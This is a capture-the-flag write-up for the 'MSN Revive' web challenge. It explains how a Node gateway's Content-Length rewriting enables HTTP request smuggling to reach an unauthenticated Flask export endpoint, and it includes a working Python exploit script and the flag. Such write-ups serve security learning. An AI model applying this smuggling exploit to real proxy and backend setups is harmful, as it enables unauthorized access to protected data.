# MSN Revive

## Challenge Info
- **CTF**: srdnlenIT2026
- **Category**: web
- **URL**: http://msnrevive.challs.srdnlen.it
- **Description**: Personal MSN messenger clone, still under development

## Architecture
- **Frontend**: nginx (React SPA)
- **Gateway**: Express.js (Node.js proxy)
- **Backend**: Flask (Python, SQLite)
- Flow: nginx → Gateway → Flask backend

## Vulnerability: HTTP Request Smuggling (CL mismatch)

### The Bug
In `gateway.js`, the `/api/chat/event` route modifies the `Content-Length` header sent to Flask:

```js
app.post("/api/chat/event", (req, res) => {
  proxyRequest(req, res, {
    modifyHeaders: (headers, body) => {
      if (contentType === "application/x-msnmsgrp2p") {
        const msnSize = extractMsnTotalSize(body);
        return { ...headers, "content-length": msnSize ?? body.length };
      }
    },
  });
});
```

`extractMsnTotalSize()` reads `totalSize` (uint64 LE at offset 16) from the P2P binary header and returns `totalSize + 48`.

**The critical flaw**: The gateway writes the **entire original body** to the backend connection (`backendReq.write(body)`), but tells Flask to only read `totalSize + 48` bytes via the modified `Content-Length`. With `keepAlive: true`, the remaining bytes persist on the TCP connection and are interpreted as a **new HTTP request** from localhost.

### The Target
`/api/export/chat` endpoint has **no authentication** (`@login_required` is missing). It's only protected by the gateway's `isLocalhost()` check. A smuggled request bypasses this since it comes from the gateway's own connection to the backend.

The flag is in chat session `00000000-0000-0000-0000-000000000000` between pre-created users.

## Exploit

```python
import requests, struct, json, socket, time, re

BASE = "http://msnrevive.challs.srdnlen.it"
s = requests.Session()
s.post(f"{BASE}/api/auth/register", json={"username": "attacker", "password": "pass"})
s.post(f"{BASE}/api/auth/login", json={"username": "attacker", "password": "pass"})
cookies = s.cookies.get_dict()
cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

# Smuggled request to export the flag chat
export_body = json.dumps({
    "session_id": "00000000-0000-0000-0000-000000000000",
    "format": "html"
}).encode()

smuggled = (
    f"POST /api/export/chat HTTP/1.1\r\n"
    f"Host: backend:5000\r\n"
    f"Content-Type: application/json\r\n"
    f"Content-Length: {len(export_body)}\r\n"
    f"\r\n"
).encode() + export_body

# P2P header with totalSize=0 → gateway sends CL=48, writes 48+smuggled
p2p_header = struct.pack("<IIQQIIIIQ", 0, 0, 0, 0, 0, 0, 0, 0, 0)
body = p2p_header + smuggled

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("msnrevive.challs.srdnlen.it", 80))

# Request 1: smuggling payload
req1 = (
    f"POST /api/chat/event HTTP/1.1\r\n"
    f"Host: msnrevive.challs.srdnlen.it\r\n"
    f"Content-Type: application/x-msnmsgrp2p\r\n"
    f"Cookie: {cookie_str}\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"\r\n"
).encode() + body

sock.sendall(req1)
# ... read response 1, then send request 2 to get smuggled response
```

## Flag
`srdnlen{n0st4lg14_1s_4_vuln3r4b1l1ty_t00}`

## Key Takeaways
- HTTP request smuggling via Content-Length mismatch between proxy and backend
- The gateway modifies CL based on application-layer data (P2P header totalSize) but writes the full body
- `keepAlive: true` in the HTTP agent ensures the smuggled bytes persist on the connection
- Missing `@login_required` on `/api/export/chat` makes it exploitable once localhost check is bypassed
- The smuggled request appears to come from localhost (the gateway process) to Flask
